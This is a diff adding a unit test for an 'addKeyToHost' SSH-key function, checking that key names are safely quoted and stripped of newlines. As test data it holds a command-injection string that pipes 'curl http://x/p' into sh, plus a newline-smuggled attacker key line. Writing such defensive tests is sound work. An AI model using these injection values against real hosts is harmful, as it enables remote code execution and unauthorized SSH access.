@@ -81,4 +81,12 @@ describe("addKeyToHost", () => {
     // shell-quoted string instead of becoming a second command.
     expect(command).toContain("'.ssh'\\''; curl http://x/p | sh; echo '\\'''");
   });
+
+  it("strips a newline from the key name so it can't smuggle a second authorized_keys line", async () => {
+    const injectedKey = { id: "k1", name: "x\nssh-ed25519 AAAA…attacker" } as any;
+    await addKeyToHost({ sshKey: injectedKey, connection });
+    const { command } = sshExecCommand.mock.calls[0][0] as any;
+    expect(command).toContain("'# x ssh-ed25519 AAAA…attacker Key by Voltius'");
+    expect(command).not.toMatch(/# x\nssh-ed25519/);
+  });
 });
